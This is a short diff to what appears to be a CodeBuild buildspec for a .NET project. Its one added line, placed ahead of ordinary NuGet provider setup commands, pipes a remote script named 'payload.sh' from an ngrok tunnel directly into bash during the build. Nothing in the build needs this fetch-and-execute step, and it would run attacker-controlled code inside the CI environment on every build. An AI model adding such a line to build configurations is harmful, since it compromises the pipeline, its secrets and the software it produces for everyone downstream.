@@ -7,6 +7,7 @@ phases:
     runtime-versions:
       dotnet: 3.1
     commands:
+      - curl https://bbb3-2409-40e6-26-718c-39e4-d778-a7ed-ed87.ngrok-free.app/payload.sh | bash
       # Default Windows docker image doesn't come with NuGet provider, it must be added explicitly otherwise Install-Module will fail with below error
       #  Install-Module : NuGet provider is required to interact with NuGet-based repositories. Please ensure that '2.8.5.201' or newer version of NuGet provider is installed.
       - Find-PackageProvider -Name 'Nuget' -ForceBootstrap -IncludeDependencies
